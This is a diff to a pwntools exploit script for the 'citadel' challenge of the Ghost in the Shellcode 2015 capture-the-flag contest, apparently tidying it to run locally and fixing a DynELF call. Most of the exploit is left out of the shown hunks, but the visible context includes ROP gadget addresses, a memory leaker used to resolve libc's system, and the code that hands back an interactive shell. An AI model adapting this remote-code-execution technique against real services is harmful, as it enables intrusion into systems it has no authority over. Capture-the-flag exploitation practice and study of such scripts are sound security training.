@@ -1,12 +1,17 @@
+#!/usr/bin/env python2
 from pwn import *
 context(arch = 'amd64', os = 'linux')
 
 # Made by Kokjo and Idolf
-if "HOST" in args:
-    HOST = args["HOST"]
+if 'HOST' in args:
+    HOST = args['HOST']
+    PORT = int(args.get('PORT', 5060))
 else:
-    HOST = 'citadel.2015.ghostintheshellcode.com'
-PORT = 5060
+    # Otherwise start the binary locally
+    HOST = 'localhost'
+    PORT = 5060
+    service = process('./citadel')
+    sleep(0.1)
 
 #Gadgets
 buf                 = 0x6131a0
@@ -104,7 +109,8 @@ def leaker(addr, length = None):
         return None
 
 #Use DynELF to get the address from system, by using the leaker.
-d = DynELF.from_elf(leaker, './citadel')
+
+d = DynELF(leaker, elf = ELF('./citadel'))
 system = d.lookup('system', "libc.so")
 
 new_conn()
@@ -122,3 +128,6 @@ r.recvuntil(" &]")
 
 #And we have shell!
 r.interactive()
+
+if service:
+    service.close()
